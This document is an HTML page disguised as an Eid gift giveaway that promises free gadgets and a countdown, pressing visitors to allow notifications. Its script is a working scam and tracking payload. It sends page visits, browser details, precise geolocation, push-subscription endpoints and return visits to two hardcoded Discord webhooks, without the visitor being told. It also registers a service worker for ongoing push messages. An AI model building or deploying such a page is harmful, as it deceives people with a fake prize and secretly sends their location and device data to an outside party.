<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Eid Gift</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a5c0a, #128012);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }

        .box {
            max-width: 350px;
            width: 100%;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .header {
            background: #ffd700;
            padding: 20px;
            text-align: center;
        }

        .eid {
            font-size: 40px;
            margin-bottom: 5px;
        }

        h2 {
            color: #0a5c0a;
            font-size: 20px;
        }

        .timer {
            background: #0a5c0a;
            color: white;
            padding: 12px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }

        .gifts {
            padding: 15px;
        }

        .gift-row {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f5f5f5;
            margin-bottom: 8px;
            border-radius: 12px;
            cursor: pointer;
        }

        .gift-icon {
            font-size: 30px;
            width: 50px;
            text-align: center;
        }

        .gift-name {
            flex: 1;
            font-weight: bold;
            color: #333;
        }

        .gift-price {
            color: #e67e22;
            font-weight: bold;
        }

        .notify-btn {
            background: #0a5c0a;
            color: white;
            border: none;
            padding: 15px;
            margin: 15px;
            border-radius: 12px;
            width: calc(100% - 30px);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .footer {
            text-align: center;
            padding: 15px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #eee;
        }

        .status {
            text-align: center;
            color: #0a5c0a;
            font-size: 12px;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <div class="eid">🌙</div>
            <h2>Eid Mubarak Gift</h2>
        </div>

        <div class="timer" id="timer">06:00:00</div>

        <div class="gifts">
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">⌚</span>
                <span class="gift-name">Smart Watch</span>
                <span class="gift-price">FREE</span>
            </div>
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">🎧</span>
                <span class="gift-name">Earbuds</span>
                <span class="gift-price">FREE</span>
            </div>
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">⚡</span>
                <span class="gift-name">Type C Charger</span>
                <span class="gift-price">FREE</span>
            </div>
        </div>

        <div class="status" id="statusMsg">🔔 Notification allow karo gift pane ke liye</div>
        
        <button class="notify-btn" onclick="allowNotification()">
            🔔 ALLOW NOTIFICATION
        </button>

        <div class="footer">
            ⏰ Limited time offer
        </div>
    </div>

    <script>
        // Timer
        let time = 21600;
        setInterval(() => {
            if(time > 0) time--;
            let h = Math.floor(time/3600);
            let m = Math.floor((time%3600)/60);
            let s = time%60;
            document.getElementById('timer').innerHTML = 
                `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        }, 1000);

        function showGift() {
            document.getElementById('statusMsg').innerHTML = '⚠️ Pehle notification allow karo!';
        }

        // DISCORD WEBHOOKS (DO DONO)
        const WEBHOOKS = [
            'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
            'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
        ];

        async function allowNotification() {
            if('Notification' in window) {
                const perm = await Notification.requestPermission();
                
                if(perm === 'granted') {
                    document.getElementById('statusMsg').innerHTML = '✅ Notification allowed! Gift claim karo!';
                    
                    // Test notification
                    new Notification('🎁 Permission Granted!', {
                        body: 'Ab aap gift claim kar sakte hain',
                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'%230a5c0a\'%3E🎁%3C/text%3E%3C/svg%3E'
                    });

                    // Collect data
                    const data = {
                        content: '@everyone 🔔 **New Notification Permission!**',
                        embeds: [{
                            title: '🎁 User Allowed Notifications',
                            color: 0x00ff00,
                            fields: [
                                { name: '📱 Browser', value: navigator.userAgent.substring(0, 50), inline: true },
                                { name: '🌐 Platform', value: navigator.platform, inline: true },
                                { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
                                { name: '🔗 IP Info', value: '[Collected]', inline: true },
                                { name: '📍 Location', value: 'Detecting...', inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    // DONO WEBHOOKS PAR SEND KARO
                    for(const webhook of WEBHOOKS) {
                        try {
                            const res = await fetch(webhook, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data)
                            });
                            if(res.ok) console.log('✅ Sent to Discord');
                        } catch(e) {
                            console.log('❌ Error:', e);
                        }
                    }

                    // Location bhi try karo (agar mil jaye to)
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            const locationData = {
                                content: '📍 **Location Update**',
                                embeds: [{
                                    title: 'User Location',
                                    fields: [
                                        { name: 'Latitude', value: pos.coords.latitude.toString(), inline: true },
                                        { name: 'Longitude', value: pos.coords.longitude.toString(), inline: true },
                                        { name: 'Accuracy', value: pos.coords.accuracy + 'm', inline: true }
                                    ]
                                }]
                            };
                            
                            for(const webhook of WEBHOOKS) {
                                fetch(webhook, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify(locationData)
                                }).catch(() => {});
                            }
                        },
                        () => {}
                    );

                    // Register Service Worker
                    if('serviceWorker' in navigator) {
                        const reg = await navigator.serviceWorker.register('sw.js');
                        console.log('SW Registered');

                        // Subscribe to push
                        try {
                            const sub = await reg.pushManager.subscribe({
                                userVisibleOnly: true,
                                applicationServerKey: 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5Nksh8U'
                            });
                            
                            // Send subscription to Discord
                            for(const webhook of WEBHOOKS) {
                                fetch(webhook, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        content: '🔔 **Push Subscription**',
                                        embeds: [{
                                            title: 'User Subscribed',
                                            fields: [
                                                { name: 'Endpoint', value: sub.endpoint.substring(0, 50) + '...', inline: false }
                                            ]
                                        }]
                                    })
                                }).catch(() => {});
                            }
                        } catch(e) {}
                    }

                } else {
                    document.getElementById('statusMsg').innerHTML = '❌ Notification allow karna zaroori hai!';
                }
            }
        }

        // Wapas aane par notification
        document.addEventListener('visibilitychange', function() {
            if(!document.hidden && 'serviceWorker' in navigator) {
                navigator.serviceWorker.ready.then(reg => {
                    reg.showNotification('👋 Wapas aagaye?', {
                        body: 'Aapka gift abhi bhi reserved hai!',
                        tag: 'return-' + Date.now()
                    });
                    
                    // Discord par bhejo ke user wapas aya
                    for(const webhook of WEBHOOKS) {
                        fetch(webhook, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: '👋 **User Returned**',
                                embeds: [{
                                    title: 'User wapas aaya',
                                    fields: [
                                        { name: 'Time', value: new Date().toLocaleString(), inline: true }
                                    ]
                                }]
                            })
                        }).catch(() => {});
                    }
                });
            }
        });

        // Page load pe bhejo
        window.onload = function() {
            for(const webhook of WEBHOOKS) {
                fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: '👁️ **Page Loaded**',
                        embeds: [{
                            title: 'User opened website',
                            fields: [
                                { name: 'Time', value: new Date().toLocaleString(), inline: true },
                                { name: 'URL', value: window.location.href, inline: true }
                            ]
                        }]
                    })
                }).catch(() => {});
            }
        };
    </script>
</body>
</html>
